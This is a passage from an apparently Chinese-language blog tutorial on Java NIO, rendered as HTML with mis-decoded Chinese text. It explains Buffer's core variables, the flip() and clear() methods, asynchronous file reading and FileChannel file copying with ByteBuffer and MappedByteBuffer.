(IOException | InterruptedException | java.util.concurrent.ExecutionException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ AsynchronousFileChannel è¯»å–æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFile</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;logs/itwanger/paicoding.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// æŒ‡å®šè¯»å–æ–‡ä»¶çš„é€‰é¡¹ã€‚</span></span><br><span class="line">            <span class="type">AsynchronousFileChannel</span> <span class="variable">fileChannel</span> <span class="operator">=</span> AsynchronousFileChannel.open(path, StandardOpenOption.READ);</span><br><span class="line">            <span class="comment">// åˆ›å»ºä¸€ä¸ª ByteBufferï¼Œç”¨äºå­˜å‚¨ä»æ–‡ä»¶ä¸­è¯»å–çš„æ•°æ®ã€‚</span></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// è°ƒç”¨ fileChannel.read() æ–¹æ³•ä»æ–‡ä»¶ä¸­å¼‚æ­¥è¯»å–æ•°æ®ã€‚è¯¥æ–¹æ³•æ¥å—ä¸€ä¸ª CompletionHandler å¯¹è±¡ï¼Œç”¨äºå¤„ç†å¼‚æ­¥æ“ä½œå®Œæˆåçš„å›è°ƒã€‚</span></span><br><span class="line">            fileChannel.read(buffer, <span class="number">0</span>, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    <span class="comment">// åœ¨ CompletionHandler çš„ completed() æ–¹æ³•ä¸­ï¼Œç¿»è½¬ ByteBufferï¼ˆattachment.flip()ï¼‰ï¼Œç„¶åä½¿ç”¨ Charset.forName(&quot;UTF-8&quot;).decode() å°†å…¶è§£ç ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°ã€‚æœ€åï¼Œæ¸…ç©ºç¼“å†²åŒºå¹¶å…³é—­æ–‡ä»¶é€šé“ã€‚</span></span><br><span class="line">                    attachment.flip();</span><br><span class="line">                    System.out.println(<span class="string">&quot;è¯»å–çš„å†…å®¹: &quot;</span> + StandardCharsets.UTF_8.decode(attachment));</span><br><span class="line">                    attachment.clear();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        fileChannel.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    <span class="comment">// å¦‚æœå¼‚æ­¥è¯»å–æ“ä½œå¤±è´¥ï¼ŒCompletionHandler çš„ failed() æ–¹æ³•å°†è¢«è°ƒç”¨ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯ã€‚</span></span><br><span class="line">                    System.out.println(<span class="string">&quot;è¯»å–å¤±è´¥&quot;</span>);</span><br><span class="line">                    exc.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ç­‰å¾…å¼‚æ­¥æ“ä½œå®Œæˆ</span></span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BIOï¼ˆBlocking I&#x2F;Oï¼‰ï¼šé‡‡ç”¨é˜»å¡å¼ I&#x2F;O æ¨¡å‹ï¼Œçº¿ç¨‹åœ¨æ‰§è¡Œ I&#x2F;O æ“ä½œæ—¶è¢«é˜»å¡ï¼Œæ— æ³•å¤„ç†å…¶ä»–ä»»åŠ¡ï¼Œé€‚ç”¨äºè¿æ¥æ•°è¾ƒå°‘ä¸”ç¨³å®šçš„åœºæ™¯ã€‚<br>NIOï¼ˆNew I&#x2F;O æˆ– Non-blocking I&#x2F;Oï¼‰ï¼šä½¿ç”¨éé˜»å¡ I&#x2F;O æ¨¡å‹ï¼Œçº¿ç¨‹åœ¨ç­‰å¾… I&#x2F;O æ—¶å¯æ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œé€šè¿‡ Selector ç›‘æ§å¤šä¸ª Channel ä¸Šçš„äº‹ä»¶ï¼Œæé«˜æ€§èƒ½å’Œå¯ä¼¸ç¼©æ€§ï¼Œé€‚ç”¨äºé«˜å¹¶å‘åœºæ™¯ã€‚<br>AIOï¼ˆAsynchronous I&#x2F;Oï¼‰ï¼šé‡‡ç”¨å¼‚æ­¥ I&#x2F;O æ¨¡å‹ï¼Œçº¿ç¨‹å‘èµ· I&#x2F;O è¯·æ±‚åç«‹å³è¿”å›ï¼Œå½“ I&#x2F;O æ“ä½œå®Œæˆæ—¶é€šè¿‡å›è°ƒå‡½æ•°é€šçŸ¥çº¿ç¨‹ï¼Œè¿›ä¸€æ­¥æé«˜äº†å¹¶å‘å¤„ç†èƒ½åŠ›ï¼Œé€‚ç”¨äºé«˜ååé‡åœºæ™¯ã€‚</p><h2 id="Bufferç¼“å†²åŒºå’ŒChannelé€šé“"><a href="#Bufferç¼“å†²åŒºå’ŒChannelé€šé“" class="headerlink" title="Bufferç¼“å†²åŒºå’ŒChannelé€šé“"></a>Bufferç¼“å†²åŒºå’ŒChannelé€šé“</h2><p>åœ¨ NIO ä¸­ï¼Œå¹¶ä¸æ˜¯ä»¥æµçš„æ–¹å¼æ¥å¤„ç†æ•°æ®çš„ï¼Œè€Œæ˜¯ä»¥ buffer ç¼“å†²åŒºå’Œ Channel é€šé“é…åˆä½¿ç”¨æ¥å¤„ç†æ•°æ®çš„ã€‚å¯ä»¥æŠŠ Channel é€šé“æ¯”ä½œé“è·¯ï¼Œbuffer ç¼“å†²åŒºæ¯”ä½œæˆç«è½¦(è¿è½½ç€è´§ç‰©),è¦æ—¶åˆ»è®°ä½ï¼šChannel ä¸ä¸æ•°æ®æ‰“äº¤é“ï¼Œå®ƒåªè´Ÿè´£è¿è¾“æ•°æ®ã€‚ä¸æ•°æ®æ‰“äº¤é“çš„æ˜¯ Buffer ç¼“å†²åŒº.ç›¸å¯¹äºä¼ ç»Ÿ IO è€Œè¨€ï¼Œæµæ˜¯å•å‘çš„ã€‚å¯¹äº NIO è€Œè¨€ï¼Œæœ‰äº† Channel é€šé“è¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä»¬çš„è¯»å†™éƒ½æ˜¯åŒå‘çš„ã€‚</p><h3 id="Buffer-ç¼“å†²åŒº"><a href="#Buffer-ç¼“å†²åŒº" class="headerlink" title="Buffer ç¼“å†²åŒº"></a>Buffer ç¼“å†²åŒº</h3><p>Buffer æ˜¯ç¼“å†²åŒºçš„æŠ½è±¡ç±» å…¶ä¸­ ByteBuffer æ˜¯ç”¨å¾—æœ€å¤šçš„å®ç°ç±»(åœ¨é€šé“ä¸­è¯»å†™å­—èŠ‚æ•°æ®)<br><img src="/2024/11/04/code/javanio/image-3.png"><br>Buffer ç±»ç»´æŠ¤äº† 4 ä¸ªæ ¸å¿ƒå˜é‡æ¥æä¾›å…³äºå…¶æ‰€åŒ…å«çš„æ•°ç»„ä¿¡æ¯ã€‚å®ƒä»¬æ˜¯ï¼š</p><ul><li>å®¹é‡ Capacity ç¼“å†²åŒºèƒ½å¤Ÿå®¹çº³çš„æ•°æ®å…ƒç´ çš„æœ€å¤§æ•°é‡ã€‚å®¹é‡åœ¨ç¼“å†²åŒºåˆ›å»ºæ—¶è¢«è®¾å®šï¼Œå¹¶ä¸”æ°¸è¿œä¸èƒ½è¢«æ”¹å˜ã€‚(ä¸èƒ½è¢«æ”¹å˜çš„åŸå› ä¹Ÿå¾ˆç®€å•ï¼Œåº•å±‚æ˜¯æ•°ç»„å˜›)</li><li>ä¸Šç•Œ Limit ç¼“å†²åŒºé‡Œçš„æ•°æ®çš„æ€»æ•°ï¼Œä»£è¡¨äº†å½“å‰ç¼“å†²åŒºä¸­ä¸€å…±æœ‰å¤šå°‘æ•°æ®ã€‚</li><li>ä½ç½® Position ä¸‹ä¸€ä¸ªè¦è¢«è¯»æˆ–å†™çš„å…ƒç´ çš„ä½ç½®ã€‚Position ä¼šè‡ªåŠ¨ç”±ç›¸åº”çš„ get()å’Œ put()å‡½æ•°æ›´æ–°ã€‚</li><li>æ ‡è®° Mark ä¸€ä¸ªå¤‡å¿˜ä½ç½®ã€‚ç”¨äºè®°å½•ä¸Šä¸€æ¬¡è¯»å†™çš„ä½ç½®ã€‚</li></ul><p>é¦–å…ˆå±•ç¤ºä¸€ä¸‹æ˜¯å¦‚ä½•åˆ›å»ºç¼“å†²åŒºçš„ï¼Œæ ¸å¿ƒå˜é‡çš„å€¼æ˜¯æ€ä¹ˆå˜åŒ–çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªç¼“å†²åŒº</span></span><br><span class="line"><span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœ‹ä¸€ä¸‹åˆå§‹æ—¶4ä¸ªæ ¸å¿ƒå˜é‡çš„å€¼</span></span><br><span class="line">System.out.println(<span class="string">&quot;åˆå§‹æ—¶--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;åˆå§‹æ—¶--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;åˆå§‹æ—¶--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;åˆå§‹æ—¶--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;--------------------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ·»åŠ ä¸€äº›æ•°æ®åˆ°ç¼“å†²åŒºä¸­</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;æ²‰é»˜ç‹äºŒ&quot;</span>;</span><br><span class="line">byteBuffer.put(s.getBytes());</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœ‹ä¸€ä¸‹åˆå§‹æ—¶4ä¸ªæ ¸å¿ƒå˜é‡çš„å€¼</span></span><br><span class="line">System.out.println(<span class="string">&quot;putå®Œä¹‹å--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;putå®Œä¹‹å--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;putå®Œä¹‹å--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;putå®Œä¹‹å--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">åˆå§‹æ—¶--&gt;limit---&gt;1024</span><br><span class="line">åˆå§‹æ—¶--&gt;position---&gt;0</span><br><span class="line">åˆå§‹æ—¶--&gt;capacity---&gt;1024</span><br><span class="line">åˆå§‹æ—¶--&gt;mark---&gt;java.nio.HeapByteBuffer[pos=0 lim=1024 cap=1024]</span><br><span class="line">--------------------------------------</span><br><span class="line">putå®Œä¹‹å--&gt;limit---&gt;1024</span><br><span class="line">putå®Œä¹‹å--&gt;position---&gt;12</span><br><span class="line">putå®Œä¹‹å--&gt;capacity---&gt;1024</span><br><span class="line">putå®Œä¹‹å--&gt;mark---&gt;java.nio.HeapByteBuffer[pos=12 lim=1024 cap=1024]</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘æƒ³è¦ä»ç¼“å­˜åŒºæ‹¿æ•°æ®ï¼Œæ€ä¹ˆæ‹¿å‘€ï¼Ÿï¼ŸNIO ç»™äº†æˆ‘ä»¬ä¸€ä¸ªflip()æ–¹æ³•ã€‚è¿™ä¸ªæ–¹æ³•å¯ä»¥æ”¹åŠ¨ position å’Œ limit çš„ä½ç½®ï¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flip()æ–¹æ³•</span></span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.println(<span class="string">&quot;flip()æ–¹æ³•ä¹‹å--&gt;limit---&gt;&quot;</span>+byteBuffer.limit());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()æ–¹æ³•ä¹‹å--&gt;position---&gt;&quot;</span>+byteBuffer.position());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()æ–¹æ³•ä¹‹å--&gt;capacity---&gt;&quot;</span>+byteBuffer.capacity());</span><br><span class="line">System.out.println(<span class="string">&quot;flip()æ–¹æ³•ä¹‹å--&gt;mark---&gt;&quot;</span> + byteBuffer.mark());</span><br></pre></td></tr></table></figure><p><img src="/2024/11/04/code/javanio/image-4.png"><br>åœ¨è°ƒç”¨ flip() ä¹‹åï¼Œlimit å˜ä¸ºå½“å‰ position çš„å€¼ï¼ˆ12ï¼‰ï¼Œposition é‡ç½®ä¸º 0ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥ä»ç¼“å†²åŒºçš„å¼€å§‹ä½ç½®è¯»å–åˆšåˆšå†™å…¥çš„æ•°æ®ï¼Œç›´åˆ° limit æŒ‡å®šçš„ä½ç½®ã€‚capacity ä¿æŒä¸å˜ï¼ˆ1024ï¼‰ã€‚å½“åˆ‡æ¢æˆè¯»æ¨¡å¼ä¹‹åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¯»å–ç¼“å†²åŒºçš„æ•°æ®äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªlimit()å¤§å°çš„å­—èŠ‚æ•°ç»„(å› ä¸ºå°±åªæœ‰limitè¿™ä¹ˆå¤šä¸ªæ•°æ®å¯è¯»)</span></span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[byteBuffer.limit()];</span><br><span class="line"><span class="comment">// å°†è¯»å–çš„æ•°æ®è£…è¿›æˆ‘ä»¬çš„å­—èŠ‚æ•°ç»„ä¸­</span></span><br><span class="line">byteBuffer.get(bytes);</span><br><span class="line"><span class="comment">// è¾“å‡ºæ•°æ®</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(bytes, <span class="number">0</span>, bytes.length));</span><br></pre></td></tr></table></figure><p>éšåè¾“å‡ºä¸€ä¸‹æ ¸å¿ƒå˜é‡çš„å€¼çœ‹çœ‹ï¼š<br><img src="/2024/11/04/code/javanio/image-5.png"><br>è¯»å®Œå¦‚ä½•è¿˜æƒ³å†™æ•°æ®åˆ°ç¼“å†²åŒºï¼Œé‚£å°±ä½¿ç”¨clear() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šâ€œæ¸…ç©ºâ€ç¼“å†²åŒºï¼Œæ•°æ®æ²¡æœ‰çœŸæ­£è¢«æ¸…ç©ºï¼Œåªæ˜¯è¢«é—å¿˜æ‰äº†<br><img src="/2024/11/04/code/javanio/image-6.png"></p><h3 id="Channel-é€šé“"><a href="#Channel-é€šé“" class="headerlink" title="Channel é€šé“"></a>Channel é€šé“</h3><p>Channel é€šé“åªè´Ÿè´£ä¼ è¾“æ•°æ®ã€ä¸ç›´æ¥æ“ä½œæ•°æ®ã€‚æ“ä½œæ•°æ®éƒ½æ˜¯é€šè¿‡ Buffer ç¼“å†²åŒºæ¥è¿›è¡Œæ“ä½œï¼é€šå¸¸ï¼Œé€šé“å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šæ–‡ä»¶é€šé“å’Œå¥—æ¥å­—é€šé“ã€‚<br>FileChannelï¼šç”¨äºæ–‡ä»¶ I&#x2F;O çš„é€šé“ï¼Œæ”¯æŒæ–‡ä»¶çš„è¯»ã€å†™å’Œè¿½åŠ æ“ä½œã€‚FileChannel å…è®¸åœ¨æ–‡ä»¶çš„ä»»æ„ä½ç½®è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œæ”¯æŒæ–‡ä»¶é”å®šä»¥åŠå†…å­˜æ˜ å°„æ–‡ä»¶ç­‰é«˜çº§åŠŸèƒ½ã€‚FileChannel æ— æ³•è®¾ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå› æ­¤å®ƒåªé€‚ç”¨äºé˜»å¡å¼æ–‡ä»¶æ“ä½œã€‚<br>SocketChannelï¼šç”¨äº TCP å¥—æ¥å­— I&#x2F;O çš„é€šé“ã€‚SocketChannel æ”¯æŒéé˜»å¡æ¨¡å¼ï¼Œå¯ä»¥ä¸ Selectorï¼ˆä¸‹æ–‡ä¼šè®²ï¼‰ä¸€èµ·ä½¿ç”¨ï¼Œå®ç°é«˜æ•ˆçš„ç½‘ç»œé€šä¿¡ã€‚SocketChannel å…è®¸è¿æ¥åˆ°è¿œç¨‹ä¸»æœºï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“ã€‚<br>ä¸ä¹‹åŒ¹é…çš„æœ‰ServerSocketChannelï¼šç”¨äºç›‘å¬ TCP å¥—æ¥å­—è¿æ¥çš„é€šé“ã€‚ä¸ SocketChannel ç±»ä¼¼ï¼ŒServerSocketChannel ä¹Ÿæ”¯æŒéé˜»å¡æ¨¡å¼ï¼Œå¹¶å¯ä»¥ä¸ Selector ä¸€èµ·ä½¿ç”¨ã€‚ServerSocketChannel è´Ÿè´£ç›‘å¬æ–°çš„è¿æ¥è¯·æ±‚ï¼Œæ¥æ”¶åˆ°è¿æ¥è¯·æ±‚åï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ SocketChannel ä»¥å¤„ç†æ•°æ®ä¼ è¾“ã€‚<br>DatagramChannelï¼šç”¨äº UDP å¥—æ¥å­— I&#x2F;O çš„é€šé“ã€‚DatagramChannel æ”¯æŒéé˜»å¡æ¨¡å¼ï¼Œå¯ä»¥å‘é€å’Œæ¥æ”¶æ•°æ®æŠ¥åŒ…ï¼Œé€‚ç”¨äºæ— è¿æ¥çš„ã€ä¸å¯é çš„ç½‘ç»œé€šä¿¡ã€‚</p><h4 id="æ–‡ä»¶é€šé“-FileChannel"><a href="#æ–‡ä»¶é€šé“-FileChannel" class="headerlink" title="æ–‡ä»¶é€šé“ FileChannel"></a>æ–‡ä»¶é€šé“ FileChannel</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FileChannel.open(Paths.get(<span class="string">&quot;docs/é…å¥—æ•™ç¨‹.md&quot;</span>), StandardOpenOption.WRITE);</span><br></pre></td></tr></table></figure><ol><li><p>ä½¿ç”¨FileChannel é…åˆ ByteBuffer ç¼“å†²åŒºå®ç°æ–‡ä»¶å¤åˆ¶çš„åŠŸèƒ½ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">    <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger1.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (sourceChannel.read(buffer) != -<span class="number">1</span>) &#123;</span><br><span class="line">      buffer.flip();</span><br><span class="line">      destinationChannel.write(buffer);</span><br><span class="line">      buffer.clear();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–æ•°æ®åï¼Œæˆ‘ä»¬è°ƒç”¨ flip() æ–¹æ³•ï¼Œä»¥ä¾¿åœ¨ç¼“å†²åŒºä¸­å‡†å¤‡å¥½è¦å†™å…¥çš„æ•°æ®ã€‚ç„¶åï¼Œæˆ‘ä»¬å°†ç¼“å†²åŒºçš„å†…å®¹å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ FileChannelï¼ˆwrite() æ–¹æ³•ï¼‰ã€‚åœ¨å†™å…¥å®Œæˆåï¼Œæˆ‘ä»¬è°ƒç”¨ clear() æ–¹æ³•é‡ç½®ç¼“å†²åŒºï¼Œä»¥ä¾¿åœ¨ä¸‹ä¸€æ¬¡è¿­ä»£ä¸­é‡ç”¨å®ƒã€‚</p></li><li><p>ä½¿ç”¨å†…å­˜æ˜ å°„æ–‡ä»¶ï¼ˆMappedByteBufferï¼‰çš„æ–¹å¼å®ç°æ–‡ä»¶å¤åˆ¶çš„åŠŸèƒ½(ç›´æ¥æ“ä½œç¼“å†²åŒº)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>), StandardOpenOption.READ);</span><br><span class="line">      <span class="type">FileChannel</span> <span class="variable">destinationChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span class="string">&quot;logs/javabetter/itwanger2.txt&quot;</span>), StandardOpenOption.WRITE, StandardOpenOption.CREATE, StandardOpenOption.READ)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">long</span> <span class="variable">fileSize</span> <span class="operator">=</span> sourceChannel.size();</span><br><span class="line">    <span class="type">MappedByteBuffer</span> <span class="variable">sourceMappedBuffer</span> <span class="operator">=</span> sourceChannel.map(FileChannel.MapMode.READ_ONLY, <span class="number">0</span>, fileSize);</span><br><span class="line">    <span class="type">MappedByteBuffer</span> <span class="variable">destinationMappedBuffer</span> <span class="operator">=</span> destinationChannel.map(FileChannel.MapMode.READ_WRITE, <span class="number">0</span>, fileSize);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fileSize; i++) &#123;</span><br><span class="line">        <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> sourceMappedBuffer.get(i);</span><br><span class="line">        destinationMappedBuffer.put(i, b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MappedByteBuffer æ˜¯ Java NIO ä¸­çš„ä¸€ä¸ªç±»ï¼Œå®ƒç»§æ‰¿è‡ª java.nio.ByteBufferã€‚MappedByteBuffer ç”¨äºè¡¨ç¤ºä¸€ä¸ªå†…å­˜æ˜ å°„æ–‡ä»¶ï¼Œå³å°†æ–‡ä»¶çš„ä¸€éƒ¨åˆ†æˆ–å…¨éƒ¨æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œä»¥ä¾¿é€šè¿‡ç›´æ¥æ“ä½œå†…å­˜æ¥å®ç°å¯¹æ–‡ä»¶çš„è¯»å†™ã€‚è¿™ç§æ–¹å¼å¯ä»¥æé«˜æ–‡ä»¶ I&#x2F;O çš„æ€§èƒ½ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿå¯ä»¥ç›´æ¥åœ¨å†…å­˜å’Œç£ç›˜ä¹‹é—´ä¼ è¾“æ•°æ®ï¼Œæ— éœ€é€šè¿‡ Java åº”ç”¨ç¨‹åºè¿›è¡Œé¢å¤–çš„æ•°æ®æ‹·è´ã€‚</p></li></ol><p>é€šå¸¸ä¸ FileChannel ä¸€èµ·ä½¿ç”¨ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ FileChannel çš„ map() æ–¹æ³•åˆ›å»º MappedByteBuffer å¯¹è±¡ã€‚map() æ–¹æ³•æ¥å—ä¸‰ä¸ªå‚æ•°ï¼šæ˜ å°„æ¨¡å¼ï¼ˆFileChannel.MapModeï¼‰æ˜ å°„èµ·å§‹ä½ç½®å’Œæ˜ å°„çš„é•¿åº¦ã€‚<br>æ˜ å°„æ¨¡å¼åŒ…æ‹¬åªè¯»æ¨¡å¼ï¼ˆREAD_ONLYï¼‰ã€è¯»å†™æ¨¡å¼ï¼ˆREAD_WRITEï¼‰å’Œä¸“ç”¨æ¨¡å¼ï¼ˆPRIVATEï¼‰ã€‚<br>æˆ‘ä»¬è®¾ç½®æºæ–‡ä»¶çš„ MappedByteBuffer ä¸ºåªè¯»æ¨¡å¼ï¼ˆREAD_ONLYï¼‰ï¼Œç›®æ ‡æ–‡ä»¶çš„ MappedByteBuffer ä¸ºè¯»å†™æ¨¡å¼ï¼ˆREAD_WRITEï¼‰ã€‚<br>åœ¨å¾ªç¯ä¸­ï¼Œæˆ‘ä»¬é€å­—èŠ‚åœ°ä»æºæ–‡ä»¶çš„ MappedByteBuffer è¯»å–æ•°æ®å¹¶å°†å…¶å†™å…¥ç›®æ ‡æ–‡ä»¶çš„ MappedByteBufferã€‚è¿™æ ·å°±å®ç°äº†æ–‡ä»¶å¤åˆ¶åŠŸèƒ½ã€‚åˆ©ç”¨å†…å­˜æ˜ å°„æ–‡ä»¶ï¼ˆMappedByteBufferï¼‰å®ç°çš„æ–‡ä»¶å¤åˆ¶ï¼Œå¯èƒ½ä¼šæ¯”ä½¿ç”¨ ByteBuffer çš„æ–¹æ³•æ›´å¿«ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨ MappedByteBuffer è¿›è¡Œæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ•°æ®çš„ä¿®æ”¹å¯èƒ½ä¸ä¼šç«‹å³å†™å…¥ç£ç›˜ã€‚å¯ä»¥é€šè¿‡è°ƒç”¨ MappedByteBuffer çš„ force() æ–¹æ³•å°†æ•°æ®ç«‹å³å†™å›ç£ç›˜ã€‚</p><ol start="3"><li>é€šé“ä¹‹é—´é€šè¿‡transfer()å®ç°æ•°æ®çš„ä¼ è¾“(ç›´æ¥æ“ä½œç¼“å†²åŒº)ï¼š<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">sourceChannel</span> <span class="operator">=</span> FileChannel.open(Paths.get(<span 